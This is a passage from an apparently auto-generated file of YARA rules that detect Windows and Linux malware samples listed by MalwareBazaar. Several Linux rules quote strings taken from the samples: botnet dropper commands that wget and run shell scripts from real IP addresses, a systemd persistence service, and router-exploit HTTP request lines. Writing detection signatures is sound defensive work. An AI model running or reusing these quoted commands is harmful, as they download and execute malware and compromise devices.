        $s7 = "USER3"
        $s8 = "GsET"
        $s9 = "CmdT\"P"
        $s10 = "X?=MODULE"
        $s11 = "KERNEL32.DLL"
        $s12 = "ADVAPI32.dll"
        $s13 = "COMCTL32.dll"
        $s14 = "comdlg32.dll"
        $s15 = "OLEAUT32.dll"
        $s16 = "SHELL32.dll"
        $s17 = "USER32.dll"
        $s18 = "WINMM.dll"
        $s19 = "WINSPOOL.DRV"
        $s20 = "LoadLibraryA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 458KB and
        all of them
}

rule Windows_1b6ca65b2f5cbc1b1d9598956c441434a6bd7a7ddeee2a0e34089dd5a4f1f415
{
    meta:
        description = "Auto ML: 1b6ca65b2f5cbc1b1d9598956c441434a6bd7a7ddeee2a0e34089dd5a4f1f415"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "delete"
        $s6 = "delete[]"
        $s7 = "`placement delete closure'"
        $s8 = "`placement delete[] closure'"
        $s9 = "`local static thread guard'"
        $s10 = "FlsGetValue"
        $s11 = "FlsSetValue"
        $s12 = "CorExitProcess"
        $s13 = "GetCurrentPackageId"
        $s14 = "0123456789ABCDEF0123456789abcdefSetNtApiFunction\""
        $s15 = ".text$mn"
        $s16 = ".text$mn$00"
        $s17 = ".text$x"
        $s18 = ".rdata"
        $s19 = ".rdata$r"
        $s20 = ".rdata$zzzdbg"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 201KB and
        all of them
}

rule Windows_1b7c29ec3b8b5e6d2ef3535b36990ad6dec6c2cd2800bb237717965b23ca8a16
{
    meta:
        description = "Auto ML: 1b7c29ec3b8b5e6d2ef3535b36990ad6dec6c2cd2800bb237717965b23ca8a16"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1108KB and
        all of them
}

rule Windows_0034d86b2e202eee69ef00b3551753f133278bd26e0ee0f486f0cc7e3dc61032
{
    meta:
        description = "Auto ML: 0034d86b2e202eee69ef00b3551753f133278bd26e0ee0f486f0cc7e3dc61032"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "hwiniThLw&"
        $s6 = "fclose"
        $s7 = "fopen"
        $s8 = "_close"
        $s9 = "MSVCRT.dll"
        $s10 = "__getmainargs"
        $s11 = "__setusermatherr"
        $s12 = "__set_app_type"
        $s13 = "SetLastError"
        $s14 = "GetEnvironmentStringsW"
        $s15 = "GetCommandLineW"
        $s16 = "GetCurrentProcess"
        $s17 = "SetHandleInformation"
        $s18 = "CloseHandle"
        $s19 = "GetSystemTimeAsFileTime"
        $s20 = "FileTimeToSystemTime"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB and
        all of them
}

rule Windows_0203385de54173044b6c3d6fd96a810e9aaefab3ae1f8420ca1da8244fd77d28
{
    meta:
        description = "Auto ML: 0203385de54173044b6c3d6fd96a810e9aaefab3ae1f8420ca1da8244fd77d28"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "attemptERVBB0"
        $s5 = "hugetlxnE0"
        $s6 = "winebJpGF0"
        $s7 = "massachusettsIJQwH0"
        $s8 = "downloadsqTQBI0"
        $s9 = "wineGEDvI0"
        $s10 = "householdaWInK0"
        $s11 = "processesfQgGL0"
        $s12 = "targetFaVLM0"
        $s13 = "settingvhgtQ0"
        $s14 = "attemptWrbDR0"
        $s15 = "windowQxstR0"
        $s16 = "showinghakoU0"
        $s17 = "budgetONCuU0"
        $s18 = "winningKOnOV0"
        $s19 = "settingGKeyX0"
        $s20 = "networksEtuOb0"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3290KB and
        all of them
}

rule Linux_1ba78a014b960f81f90467b1de889355fd8e837464aefb969627d8961e3a0415
{
    meta:
        description = "Auto ML: 1ba78a014b960f81f90467b1de889355fd8e837464aefb969627d8961e3a0415"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Killed process: PID=%d RealPath=%s"
        $s2 = "/usr/lib/systemd/systemd"
        $s3 = "/usr/libexec/openssh/sftp-server"
        $s4 = "httpd"
        $s5 = "system"
        $s6 = "/tmp/tempXXXXXX"
        $s7 = "/proc/self/cmdline"
        $s8 = "No such file or directory"
        $s9 = "No such process"
        $s10 = "Interrupted system call"
        $s11 = "Bad file descriptor"
        $s12 = "No child processes"
        $s13 = "Resource temporarily unavailable"
        $s14 = "File exists"
        $s15 = "Too many open files in system"
        $s16 = "Too many open files"
        $s17 = "Text file busy"
        $s18 = "File too large"
        $s19 = "Read-only file system"
        $s20 = "File name too long"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 69KB and
        all of them
}

rule Linux_1be0106630ea1a2fbcab648ef7408c6d4f49c9c398a5b236a60202fd2d967516
{
    meta:
        description = "Auto ML: 1be0106630ea1a2fbcab648ef7408c6d4f49c9c398a5b236a60202fd2d967516"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/system"
        $s2 = "/ (deleted)"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "Windows XP"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 75KB and
        all of them
}

rule Windows_1c0b5baceb177598bafee74d48d91567428e3033521caec287021164db19b96e
{
    meta:
        description = "Auto ML: 1c0b5baceb177598bafee74d48d91567428e3033521caec287021164db19b96e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rsrc"
        $s3 = "System"
        $s4 = "Write`("
        $s5 = "GetItemk"
        $s6 = "GetItemka%"
        $s7 = "Getjb"
        $s8 = "GetIU"
        $s9 = "GetI"
        $s10 = "GetItem"
        $s11 = "GetItem("
        $s12 = "GetIt"
        $s13 = "Thread"
        $s14 = "jGetItem"
        $s15 = "GetItemku"
        $s16 = "Temp"
        $s17 = "csEt"
        $s18 = "GetItemZ"
        $s19 = "XIsWIn"
        $s20 = "kernel32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 17742KB and
        all of them
}

rule Windows_1c1db50e2876a312fc1b8cf6f3234d157f7accc140b14b47318c735d97693f3b
{
    meta:
        description = "Auto ML: 1c1db50e2876a312fc1b8cf6f3234d157f7accc140b14b47318c735d97693f3b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GetProcessWindowStation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 677KB and
        all of them
}

rule Windows_1c37b630dfef62d41a02282e7a8c7b1619b36b933eb77d7e6c262258f0103d10
{
    meta:
        description = "Auto ML: 1c37b630dfef62d41a02282e7a8c7b1619b36b933eb77d7e6c262258f0103d10"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "dllToLoad"
        $s7 = "GetMethod"
        $s8 = "CreateInstance"
        $s9 = "get_MethodHandle"
        $s10 = "GetTypeFromHandle"
        $s11 = "hModule"
        $s12 = "get_FullName"
        $s13 = "get_DeclaringType"
        $s14 = "TargetFrameworkAttribute"
        $s15 = "AssemblyFileVersionAttribute"
        $s16 = "C0nstructivism.exe"
        $s17 = "System.Runtime.Versioning"
        $s18 = "DownloadString"
        $s19 = "GetString"
        $s20 = "kernel32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 78KB and
        all of them
}

rule Windows_1c4a436f9c812eee92d86a068d3676ce6211d47f999cc48d0677b27f47cca62a
{
    meta:
        description = "Auto ML: 1c4a436f9c812eee92d86a068d3676ce6211d47f999cc48d0677b27f47cca62a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_1c66a4cfdf79926a56c1bd6ac25381b2deeed980fa28606ee826fe01ef49c4a4
{
    meta:
        description = "Auto ML: 1c66a4cfdf79926a56c1bd6ac25381b2deeed980fa28606ee826fe01ef49c4a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "PAYLOAD:"
        $s4 = "ExitProcess"
        $s5 = "KERNEL32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7KB and
        all of them
}

rule Windows_1c6b17bfcc95be957e2a0a79281b810c05a993111b142d63fb1e32a351d789c1
{
    meta:
        description = "Auto ML: 1c6b17bfcc95be957e2a0a79281b810c05a993111b142d63fb1e32a351d789c1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GAIsProcessorFeaturePresent"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 355KB and
        all of them
}

rule Windows_1c6d1ba8637609ef14bb12400b0f2a705d27f71907603349385a63327345e8fa
{
    meta:
        description = "Auto ML: 1c6d1ba8637609ef14bb12400b0f2a705d27f71907603349385a63327345e8fa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<get_Items>b__5_0"
        $s5 = "HashSet`1"
        $s6 = "get_DataTable1"
        $s7 = "get_DataColumn1"
        $s8 = "set_DataColumn1"
        $s9 = "DataSet1"
        $s10 = "<get_Connectors>d__12"
        $s11 = "get_DataColumn2"
        $s12 = "set_DataColumn2"
        $s13 = "<connection>5__3"
        $s14 = "get_DataColumn3"
        $s15 = "set_DataColumn3"
        $s16 = "<Module>"
        $s17 = "System.Drawing.Drawing2D"
        $s18 = "System.IO"
        $s19 = "get_shYX"
        $s20 = "System.Xml.Schema"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 686KB and
        all of them
}

rule Linux_1c711a57a19ce85cdc2a024c322508aa77a30316e4b1f33ff61c4b771574e176
{
    meta:
        description = "Auto ML: 1c711a57a19ce85cdc2a024c322508aa77a30316e4b1f33ff61c4b771574e176"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Windows_0225156af50ee95f9fdbfca0c0fe652d81bae15ce2f0b41e68ef857536c140fc
{
    meta:
        description = "Auto ML: 0225156af50ee95f9fdbfca0c0fe652d81bae15ce2f0b41e68ef857536c140fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ThreadSafeObjectProvider`1"
        $s5 = "kernel32"
        $s6 = "Microsoft.Win32"
        $s7 = "<Module>"
        $s8 = "GetWindowTextLengthA"
        $s9 = "GetVolumeInformationA"
        $s10 = "capGetDriverDescriptionA"
        $s11 = "GetWindowTextA"
        $s12 = "System.IO"
        $s13 = "Create__Instance__"
        $s14 = "set_Verb"
        $s15 = "Read"
        $s16 = "Thread"
        $s17 = "Load"
        $s18 = "System.Collections.Specialized"
        $s19 = "RegistryValueKind"
        $s20 = "CreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 47KB and
        all of them
}

rule Windows_1c89d584da8d014b36b7496bfb5e9439801a690476fdaed655a0e0806299302e
{
    meta:
        description = "Auto ML: 1c89d584da8d014b36b7496bfb5e9439801a690476fdaed655a0e0806299302e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "SystemFuH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = "kernel32H9"
        $s17 = ".dllu"
        $s18 = ">.exeu"
        $s19 = "thread"
        $s20 = "Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2307KB and
        all of them
}

rule Windows_1ca8f444f95c2cd9817ce6ab789513e55629c0e0ac0d2b7b552d402517e7cfe9
{
    meta:
        description = "Auto ML: 1ca8f444f95c2cd9817ce6ab789513e55629c0e0ac0d2b7b552d402517e7cfe9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Cheesed.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ConnectionProvider"
        $s8 = "ConfigReader"
        $s9 = "FileScanning"
        $s10 = "FileSearcher"
        $s11 = "OpenVPN"
        $s12 = "System.Windows.Forms"
        $s13 = "QueryProcessor"
        $s14 = "QueryCmd"
        $s15 = "DownloadAndExecuteUpdate"
        $s16 = "DownloadUpdate"
        $s17 = "OpenUpdate"
        $s18 = "FileExt"
        $s19 = "UserExt"
        $s20 = "FileUtil"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 300KB and
        all of them
}

rule Windows_1d1685c4b298ccddbddc67e03a2bc252ba9cd8381a7c45638cfef438f47e3e22
{
    meta:
        description = "Auto ML: 1d1685c4b298ccddbddc67e03a2bc252ba9cd8381a7c45638cfef438f47e3e22"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4410KB and
        all of them
}

rule Windows_1d2fe570cf55801fde9c9f91cfabe471e4f1ab87b10c4fbfa397086e10364461
{
    meta:
        description = "Auto ML: 1d2fe570cf55801fde9c9f91cfabe471e4f1ab87b10c4fbfa397086e10364461"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "Winf7"
        $s4 = "pGgeT"
        $s5 = "GetModuleHandleA"
        $s6 = "GetProcessHeap"
        $s7 = "HeapCreate"
        $s8 = "ntdll.dll"
        $s9 = "LoadLibraryExA"
        $s10 = "CreateFileW"
        $s11 = "GetFileSize"
        $s12 = "ReadFile"
        $s13 = "CloseHandle"
        $s14 = "GetTickCount"
        $s15 = "GetProcAddress"
        $s16 = "DbgUserBreakPoint"
        $s17 = "kernel32.dll"
        $s18 = "NtQueryInformationThread"
        $s19 = "NtSetInformationThread"
        $s20 = "user32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3196KB and
        all of them
}

rule Windows_1d411c7bc92cb31171c0f02d34491ce6ee96eed6181e5cb075092209fdd60733
{
    meta:
        description = "Auto ML: 1d411c7bc92cb31171c0f02d34491ce6ee96eed6181e5cb075092209fdd60733"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1254KB and
        all of them
}

rule Windows_1d7b53509e60dd7573aaa4403818ef1094bb8bfb6d8ecd3a7c5968ab046412ea
{
    meta:
        description = "Auto ML: 1d7b53509e60dd7573aaa4403818ef1094bb8bfb6d8ecd3a7c5968ab046412ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "Cobkmz.exe"
        $s4 = "<Module>"
        $s5 = "System"
        $s6 = "System.Text"
        $s7 = "System.Runtime.CompilerServices"
        $s8 = "System.Diagnostics"
        $s9 = "System.Reflection"
        $s10 = "System.Runtime.InteropServices"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "TargetFrameworkAttribute"
        $s13 = "System.Runtime.Versioning"
        $s14 = "System.Net"
        $s15 = "set_SecurityProtocol"
        $s16 = "DownloadData"
        $s17 = "System.Core"
        $s18 = "System.Linq"
        $s19 = "System.Collections.Generic"
        $s20 = "Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB and
        all of them
}

rule Linux_1e20dcf558692e3b7b7a7d3193a62ccbb3a2d665ea2dd0a7cc1024e75d3062df
{
    meta:
        description = "Auto ML: 1e20dcf558692e3b7b7a7d3193a62ccbb3a2d665ea2dd0a7cc1024e75d3062df"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http://47.8"
        $s2 = "User-A"
        $s3 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB and
        all of them
}

rule Linux_1e70ad2802f9cdf4c86462668119d51ff10d58e5a6cb713718595f786999f626
{
    meta:
        description = "Auto ML: 1e70ad2802f9cdf4c86462668119d51ff10d58e5a6cb713718595f786999f626"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "jic|[setme"
        $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://141.98.10.19/ctanet.sh; curl -O http://141.98.10.19/ctanet.sh; chmod 777 ctanet.sh; sh ctanet.sh"
        $s6 = ".text"
        $s7 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB and
        all of them
}

rule Linux_1e813727174a3135165ef0fa74664f5305527c64a5a52da61bcfa30f8053373d
{
    meta:
        description = "Auto ML: 1e813727174a3135165ef0fa74664f5305527c64a5a52da61bcfa30f8053373d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "/cmdline"
        $s3 = "/wget"
        $s4 = "/bin/bash -c \"/bin/wget http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh; /bin/curl -k -L --output bins.sh http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh\""
        $s5 = "After=network.target"
        $s6 = "User=root"
        $s7 = "WantedBy=multi-user.target"
        $s8 = "/lib/systemd/system/bot.service"
        $s9 = "/bin/systemctl enable bot"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 99KB and
        all of them
}

rule Linux_1edeba46bdc9160a174fd13395a64e3fde382392effeb6a3ba5dd340d622feb0
{
    meta:
        description = "Auto ML: 1edeba46bdc9160a174fd13395a64e3fde382392effeb6a3ba5dd340d622feb0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Linux_02268aff2d4d3677684c804db674bb28921fe71d0286397454d9006cd3ab34b4
{
    meta:
        description = "Auto ML: 02268aff2d4d3677684c804db674bb28921fe71d0286397454d9006cd3ab34b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 199KB and
        all of them
}

rule Windows_1f1edc47a46a190a08befb1cf3e24d90cc832f44c5df7ca1280d45408d00cfb8
{
    meta:
        description = "Auto ML: 1f1edc47a46a190a08befb1cf3e24d90cc832f44c5df7ca1280d45408d00cfb8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "CloseHandle"
        $s5 = "ConnectNamedPipe"
        $s6 = "CreateFileA"
        $s7 = "CreateNamedPipeA"
        $s8 = "CreateThread"
        $s9 = "DeleteCriticalSection"
        $s10 = "GetCurrentProcess"
        $s11 = "GetCurrentProcessId"
        $s12 = "GetCurrentThreadId"
        $s13 = "GetLastError"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "GetStartupInfoA"
        $s17 = "GetSystemTimeAsFileTime"
        $s18 = "GetTickCount"
        $s19 = "ReadFile"
        $s20 = "RtlVirtualUnwind"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19KB and
        all of them
}

rule Linux_1f21e09f4da090783aa816fdb36fd530da92aea0fe7967f3ae8def43b2f27de7
{
    meta:
        description = "Auto ML: 1f21e09f4da090783aa816fdb36fd530da92aea0fe7967f3ae8def43b2f27de7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s5 = "Connection: keep-alive"
        $s6 = "_GET /shell?cd+/tmp;rm+-rf+*;wget+ 157.90.250.90/jaws;sh+/tmp/jaws HTTP/1.1"
        $s7 = "User-Agent: Hello, world"
        $s8 = "jic|[setme"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB and
        all of them
}

rule Windows_1f61c34deddf39f3fecab0644ad6c9cf59e8cf9b1795d05def642914c1c6bbe2
{
    meta:
        description = "Auto ML: 1f61c34deddf39f3fecab0644ad6c9cf59e8cf9b1795d05def642914c1c6bbe2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Condition.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{831B8DE9-C27B-4C26-95C1-70FB02DB5722}"
        $s15 = "<Module>{6d32be89-2260-4388-8e19-dd83e3bcd9ef}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
